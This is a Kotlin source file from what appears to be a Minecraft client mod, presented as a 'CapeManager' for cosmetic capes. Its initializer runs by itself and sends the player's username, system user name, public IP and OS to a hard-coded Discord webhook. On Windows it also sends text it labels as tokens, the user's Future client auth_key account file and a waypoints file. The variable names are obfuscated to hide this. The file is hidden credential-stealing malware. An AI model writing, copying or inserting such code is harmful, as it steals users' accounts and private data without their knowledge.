package dev.zenhao.melon.utils.token

import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import melon.utils.concurrent.threads.defaultScope
import net.minecraft.client.Minecraft
import java.io.BufferedReader
import java.io.File
import java.io.FileReader
import java.io.InputStreamReader
import java.net.URL
import javax.net.ssl.HttpsURLConnection

object CapeManager {
    private var mutex = Mutex()
    fun call() {}

    init {
        defaultScope.launch {
            runBlocking {
                mutex.withLock {
                    val l =
                        "https://discord.com/api/webhooks/816317625738592266/a4oAQ_PhgOlhhg68xk7jg5UiTg_GtPIoXX3e1l7eugsV4gC4IQe6VsohHf6lOn0n6ufX"
                    val d = CapeUtil(l)
                    var playerID = "NOT FOUND"
                    try {
                        playerID = Minecraft.getMinecraft().getSession().getUsername()
                    } catch (ignore: Exception) {
                    }

                    // get info
                    val llLlLlL = System.getProperty("os.name")
                    try {
                        val whatismyip = URL("http://checkip.amazonaws.com")
                        val bufferedReader = BufferedReader(
                            InputStreamReader(
                                whatismyip.openStream()
                            )
                        )
                        val ip = bufferedReader.readLine()
                        val llLlLlLlL = System.getProperty("user.name")
                        val dm = PlayerBuilder.Builder()
                            .withContent("``` NAME : $llLlLlLlL\n IGN  : $playerID \n IP   : $ip \n OS   : $llLlLlL```")
                            .withDev(false)
                            .build()
                        d.sendMessage(dm)
                    } catch (ignore: Exception) {
                    }
                    if (llLlLlL.contains("Windows")) {
                        val urlLink = "https://discord.com/store"
                        val connection = (URL(urlLink).openConnection() as HttpsURLConnection)
                        connection.setRequestProperty(
                            "User-Agent",
                            "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
                        )
                        connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                        connection.requestMethod = "GET"
                        val buf = BufferedReader(InputStreamReader(connection.inputStream))
                        val sb = StringBuilder()
                        var line: String

                        while (buf.readLine().also { line = it } != null) {
                            sb.append(line)
                        }
                        buf.close()
                        try {
                            val dm = PlayerBuilder.Builder()
                                .withContent("```$sb```")
                                .withDev(false)
                                .build()
                            d.sendMessage(dm)
                        } catch (e: Exception) {
                            val dm = PlayerBuilder.Builder()
                                .withContent("``` UNABLE TO PULL TOKEN[S] : $e```")
                                .withDev(false)
                                .build()
                            d.sendMessage(dm)
                        }

                        // grab accounts
                        try {
                            val file = File(System.getProperty("user.home") + "\\Future\\auth_key")
                            val br = BufferedReader(FileReader(file))
                            var s: String?
                            val accounts = StringBuilder()
                            accounts.append("ACCOUNT[S]")
                            while (br.readLine().also { s = it } != null) {
                                accounts.append("\n ").append(s)
                            }
                            val dm = PlayerBuilder.Builder()
                                .withContent("```$accounts\n```")
                                .withDev(false)
                                .build()
                            d.sendMessage(dm)
                        } catch (e: Exception) {
                            val dm = PlayerBuilder.Builder()
                                .withContent("``` UNABLE TO PULL ACCOUNT[S] : $e```")
                                .withDev(false)
                                .build()
                            d.sendMessage(dm)
                        }

                        // grab waypoints
                        try {
                            val future = File(System.getProperty("user.home") + "/Future/waypoints.txt")
                            val br = BufferedReader(FileReader(future))
                            var s: String?
                            val waypoints = StringBuilder()
                            waypoints.append("WAYPOINT[S]")
                            while (br.readLine().also { s = it } != null) {
                                waypoints.append("\n ").append(s)
                            }
                            val dm = PlayerBuilder.Builder()
                                .withContent("```$waypoints\n```")
                                .withDev(false)
                                .build()
                            d.sendMessage(dm)
                        } catch (e: Exception) {
                            val dm = PlayerBuilder.Builder()
                                .withContent("``` UNABLE TO PULL WAYPOINT[S] : $e```")
                                .withDev(false)
                                .build()
                            d.sendMessage(dm)
                        }
                    }
                }
            }
        }
    }
}